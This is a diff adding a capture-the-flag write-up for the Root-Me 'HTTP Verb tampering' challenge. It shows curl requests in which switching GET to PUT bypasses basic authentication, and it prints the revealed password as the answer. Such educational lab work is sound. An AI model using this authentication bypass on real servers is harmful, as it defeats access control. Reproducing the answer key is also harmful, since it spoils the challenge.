@@ -17,7 +17,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 9. [HTTP - Headers](#http-headers) 🗸
 10. [HTTP - POST](#http-post) 🗸
 11. [HTTP - Improper redirect](#http-improper-redirect) 🗸
-12. [HTTP - Verb tampering](#http-verb-tampering)
+12. [HTTP - Verb tampering](#http-verb-tampering) 🗸
 13. [Install files](#install-files)
 14. [CRLF](#crlf)
 15. [File upload - Double extensions](#file-upload-double-extensions)
@@ -1209,6 +1209,96 @@ $ curl http://challenge01.root-me.org/web-serveur/ch32/index.php
 
 ~~~
 ExecutionAfterRedirectIsBad
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP Verb tampering
+
+- Author: g0uZ
+- Date: 3 February 2011
+- Points: 15
+- Level: 2
+
+### Statement
+
+Bypass the security establishment.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch8/).
+
+### Resources
+
+1. [RFC 2617](https://repository.root-me.org/RFC/EN%20-%20rfc2617.txt).
+2. [RFC 2069](https://repository.root-me.org/RFC/EN%20-%20rfc2069.txt).
+3. [HTTP basic authentication and digest authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20basic%20authentication%20and%20digest%20authentication.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we get a prompt for a username and password.
+
+We can use CURL to submit a GET request:
+
+~~~shell
+$ curl -X GET http://challenge01.root-me.org/web-serveur/ch8/
+~~~
+
+We get the standard response:
+
+~~~html
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<title>401 Authorization Required</title>
+</head><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+<h1>Authorization Required</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr/>
+<address>Apache Server at challenge01.root-me.org Port 80</address>
+
+</body></html>
+~~~
+
+We can see the website uses Apache Server, and the challenge suggests we should be using different verbs.  We can find various [HTTP request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods).  Trying PUT with CURL we get:
+
+~~~shell
+$curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html><head>
+</head>
+
+<h1>Mot de passe / password : a23e$dme96d3saez$$prap
+</h1>
+</body></html>
+~~~
+
+This gives us the password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+a23e$dme96d3saez$$prap
 ~~~
 
 </details>
